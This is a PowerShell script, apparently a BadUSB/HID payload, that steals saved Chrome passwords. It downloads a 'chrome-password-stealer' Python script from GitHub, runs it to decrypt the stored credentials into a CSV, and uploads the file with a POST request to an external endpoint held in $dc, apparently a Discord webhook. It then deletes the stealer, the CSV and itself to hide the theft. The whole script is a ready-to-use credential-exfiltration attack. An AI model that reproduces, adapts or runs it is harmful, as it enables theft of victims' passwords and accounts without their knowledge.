cd $env:USERPROFILE\Documents

#$filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"

py -m pip install pycryptodomex pywin32

Invoke-WebRequest -Uri https://raw.githubusercontent.com/simen64/Simons-HID-Scripts/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py

#& $env:LocalAppData\Programs\Python\Python311\python.exe $Env:USERPROFILE\Documents\stealer.py
# Search for Python in the PATH variable
$pythonExe = Get-Command python | Select-Object -ExpandProperty Source

# Check if Python was found
if ($pythonExe -ne $null) {
    # Execute the Python script using the found Python executable
    & $pythonExe $Env:USERPROFILE\Documents\stealer.py
} else {
    Write-Host "Python not found in the PATH."
}

Write-Host "Sending data to $dc"



$user = $env:USERNAME

$file = "C:\Users\$user\Documents\decrypted_password.csv"

$message = "Extracted passwords:"

$boundary = [System.Guid]::NewGuid().ToString()

$fileContent = [System.IO.File]::ReadAllBytes($file)

$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"content`"",
    "",
    $message,
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"file.txt`"",
    "Content-Type: application/octet-stream",
    "",
    [System.Text.Encoding]::Default.GetString($fileContent),
    "--$boundary--"
)

$body = $bodyLines -join "`r`n"

$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

Write-Host "Sending data to $dc"
Invoke-RestMethod -Uri $dc -Method Post -Headers $headers -Body $body

pause

Remove-Item stealer.py -Force
Remove-item decrypted_password.csv -Force
Remove-Item -Path $MyInvocation.MyCommand.Source

pause
